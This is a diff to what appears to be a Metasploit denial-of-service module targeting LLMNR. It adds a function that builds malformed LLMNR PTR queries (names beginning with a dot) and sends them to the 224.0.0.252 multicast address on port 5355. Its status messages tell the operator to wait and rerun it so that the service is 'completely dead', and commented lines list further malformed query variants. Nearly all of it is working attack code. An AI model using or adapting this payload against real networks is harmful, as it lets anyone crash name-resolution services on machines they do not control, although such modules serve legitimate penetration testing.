@@ -9,7 +9,6 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Dos
-  include Msf::Auxiliary::LLMNR
 
   def initialize
     super(
@@ -36,18 +35,51 @@ class Metasploit3 < Msf::Auxiliary
         ],
       'DisclosureDate' => 'Apr 12 2011')
 
-      register_options(
+    register_options(
       [
-        OptString.new('NAME', [true, 'The name to query', '.1.1.in-addr.arpa']),
-        OptString.new('TYPE', [true, 'The query type (name, # or TYPE# -- should be PTR)', 'PTR']),
-        OptString.new('CLASS', [true, 'The query class (name, # or CLASS# -- should be IN)', 'IN'])
-      ], Msf::Auxiliary::LLMNR)
+        Opt::RPORT(5355),
+        Opt::RHOST('224.0.0.252')
+      ])
   end
+
+  def make_query(str)
+    pkt = ""
+
+    # id
+    pkt << [rand(65535)].pack('n')
+
+    # flags
+    pkt << [(
+      '0' +     # qr
+      '0000' +  # opcode
+      '0' +     # conflict
+      '0' +     # truncation
+      '0' +     # tenative
+      '0000' +  # zero (reserved)
+      '0000'    # rcode
+      )].pack('B16')
+
+    # counts
+    pkt << [1,0,0,0].pack('n*')
+
+    if str[0,1] == "."
+      pkt << [str.length].pack('C')
+    end
+    pkt << str + "\x00"
+
+    # type / class (PTR/IN)
+    pkt << [0x0c, 0x01].pack('n*')
+
+    pkt
+  end
+
 
   def run
     connect_udp
 
-    # TODO: various compressed queries
+    # query
+
+    # various compressed queries
     #pkt << "\x03" + ("%d" % 192)
     #pkt << "\x03" + "144" + "\x01" + "0" + "\x03" + "168" + "\x03" + "192"
     #pkt << ("\x01" + '1') * 0x20
@@ -57,8 +89,13 @@ class Metasploit3 < Msf::Auxiliary
     #pkt << "\x03" + 'ip6' + "\x04" + 'arpa' + "\x00"
     #pkt << ".e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f".gsub('.', "\x01") + "\x03ip6\x04arpa\x00"
 
-    print_status("#{rhost}:#{rport} Sending LLMNR query #{query_type_name}/#{query_type_name} for #{query_name}")
-    udp_sock.put(query)
+    pkt = make_query(".1.1.ip6.arpa")
+    print_status("Sending Ipv6 LLMNR query to #{rhost}")
+    udp_sock.put(pkt)
+
+    pkt = make_query(".1.1.in-addr.arpa")
+    print_status("Sending Ipv4 LLMNR query to #{rhost}")
+    udp_sock.put(pkt)
 
     print_status("Note, in a default configuration, the service will restart automatically twice.")
     print_status("In order to ensure it is completely dead, wait up to 5 minutes and run it again.")
